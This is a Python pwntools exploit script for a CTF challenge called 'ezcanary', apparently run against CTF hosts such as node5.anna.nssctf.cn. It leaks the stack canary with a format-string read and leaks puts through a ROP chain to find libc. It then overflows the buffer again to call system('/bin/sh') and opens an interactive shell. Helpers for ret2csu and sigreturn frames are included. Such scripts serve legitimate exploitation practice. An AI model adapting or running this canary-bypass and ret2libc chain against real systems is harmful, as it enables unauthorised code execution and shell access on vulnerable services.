from pwn import *
from LibcSearcher import *
from ae64 import AE64

context(arch="amd64", os="linux", log_level="debug")
context.terminal = ["tmux", "split", "-h"]
# context(arch="amd64",os="linux",log_level="debug")
binary = "./ezcanary/ezcanary"
libc_addr = "./ezcanary/libc.so.6"
ld_addr = "../../glibc-all-in-one/libs/2.31-0ubuntu9_i386/ld-2.31.so"

rop = ROP(binary)
elf = ELF(binary)

libc = ELF(libc_addr)
ld = ELF(ld_addr)
# libc_dll = cdll.LoadLibrary(libc)


local = 1

ip, port = "61.147.171.105", 22518
# ip, port = "chall.pwnable.tw" 1
if local == 0:
    p = process(binary)
    dbg = lambda p: gdb.attach(p)
else:
    # p = remote(ip, port)
    # p = remote("pwn.challenge.ctf.show",port)
    # p = remote("node5.buuoj.cn", port)
    p = remote("node5.anna.nssctf.cn", port)
    dbg = lambda _: None


ls = lambda addr: log.success(hex(addr))


def search(func_name: str, func_addr: int):
    log.success(func_name + ": " + hex(func_addr))
    libc = LibcSearcher(func_name, func_addr)
    offset = func_addr - libc.dump(func_name)
    binsh = offset + libc.dump("str_bin_sh")
    system = offset + libc.dump("system")
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


def search_from_libc(func_name: str, func_addr: int, libc=libc):
    log.success(func_name + ": " + hex(func_addr))
    offset = func_addr - libc.symbols[func_name]
    binsh = offset + libc.search(b"/bin/sh").__next__()
    system = offset + libc.symbols["system"]
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


# __libc_start_main

csu_start = 0x0


def csu(edi=0, rsi=0, rdx=0, r12=0, start=csu_start):
    end = start + 0x1A
    payload = p64(end)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(r12)  # r12
    payload += p64(edi)  # edi
    payload += p64(rsi)  # rsi
    payload += p64(rdx)  # rdx
    payload += p64(start)
    payload += b"a" * 56
    return payload


def sig(rax=0, rdi=0, rsi=0, rdx=0, rsp=0, rip=0):
    sigframe = SigreturnFrame()
    sigframe.rax = rax
    sigframe.rdi = rdi  # "/bin/sh" 's addr
    sigframe.rsi = rsi
    sigframe.rdx = rdx
    sigframe.rsp = rsp
    sigframe.rip = rip
    return bytes(sigframe)


# =================start=================#
puts_plt = elf.plt.puts
puts_got = elf.got.puts
ret_addr = 0x000000000040101A
rdi_addr = 0x0000000000401323
# offset => 6

payload = b"%51$p"
p.sendlineafter(b"name:", payload)
p.recvuntil(b"0x")

canary = int(p.recvuntil(b"\n", drop=True), 16)
ls(canary)

payload = b"a" * 0x108
payload += p64(canary)
payload += p64(0x404300)
payload += p64(rdi_addr)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(0x4011D6)
p.sendline(payload)

puts_addr = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\0"))
sys, sh = search_from_libc("puts", puts_addr)

dbg(p)

p.sendlineafter(b"name:", b"b")

payload = b"a" * (0x108)
payload += p64(canary)
payload += p64(0xDEADBEEF)
payload += p64(ret_addr)
payload += p64(rdi_addr)
payload += p64(sh)
payload += p64(sys)
p.sendlineafter(b"b", payload)


p.interactive()
